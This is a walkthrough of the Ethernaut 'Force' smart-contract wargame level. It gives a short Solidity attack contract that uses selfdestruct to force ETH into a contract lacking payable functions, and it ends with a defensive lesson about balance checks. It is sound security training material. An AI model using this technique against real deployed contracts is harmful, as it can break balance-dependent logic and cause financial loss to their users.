---
title: "Force – Level 7 Walkthrough"
summary: "Step-by-step walkthrough for the Force Ethernaut level. Learn how to forcibly send ETH to a contract using selfdestruct, even if it has no payable functions."
date: "Jun 26 2025"
tags:
- Ethereum
- Smart Contracts
- Security
- Ethernaut
- Walkthrough
---

# Force – Level 7 Walkthrough

Welcome to the **Force** level of the [**Ethernaut**](https://ethernaut.openzeppelin.com/) wargame by OpenZeppelin. This challenge demonstrates how ETH can be sent to a contract even if it lacks payable functions or a fallback/receive function.

---

## Objective

The contract in this level has **no payable functions** and **no receive/fallback function**. Your goal is to **force ETH into the contract's balance** and complete the level.

---

## Getting Started

1. Visit [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Force"** level
3. Click **“Get new instance”** and approve the transaction via MetaMask
4. Once the instance is deployed, the `contract` object is available in your browser console
5. Note the address of the deployed instance:

    ```js
    contract.address
    ```

---

## Walkthrough

The only way to send ETH to this contract is by using the `selfdestruct()` function in another contract. This opcode **forces** a balance transfer to any address, regardless of whether the recipient contract can receive ETH via normal means.

### Step 1: Write the Exploit Contract

Create a new file in [Remix IDE](https://remix.ethereum.org/) called `ForceAttack.sol` and paste the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
     constructor() public payable {}

     function attack(address payable target) public {
          selfdestruct(target);
     }
}
```

**How it works:**

- The constructor is `payable`, so you can send ETH when deploying.
- The `attack()` function calls `selfdestruct(target)`, which destroys the contract and sends its ETH balance to the target address, even if the target contract can't normally receive ETH.

---

### Step 2: Deploy the Attack Contract

1. In Remix, compile the contract with Solidity 0.6.0
2. Deploy the contract, specifying a small amount of ETH (e.g., `1 wei`) in the value field
3. Use the **Injected Web3** environment (MetaMask) and ensure you're on the correct testnet

---

### Step 3: Execute the Attack

1. After deployment, expand your contract in Remix
2. Call the `attack()` function, passing your Ethernaut instance address as the parameter:

    ```
    attack("0xInstanceAddress")
    ```

3. Confirm the transaction in MetaMask

---

### Step 4: Verify the Transfer

Check the balance of your Ethernaut contract instance:

```js
await web3.eth.getBalance(contract.address)
```

The balance should now be greater than 0 (in wei).

---

### Step 5: Submit the Level

Click **Submit Instance** in the Ethernaut UI and confirm in MetaMask.

🎉 Done! You've completed the Force level.

---

## 💡 What You Learn

- ETH can be forcibly sent to any contract using `selfdestruct`
- Contracts can receive ETH even if they don't have payable functions or a fallback/receive function
- Smart contract logic should not rely solely on balance checks for security

---

## Resources

- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
- [Solidity Docs – selfdestruct](https://docs.soliditylang.org/en/v0.6.12/control-structures.html#selfdestruct)
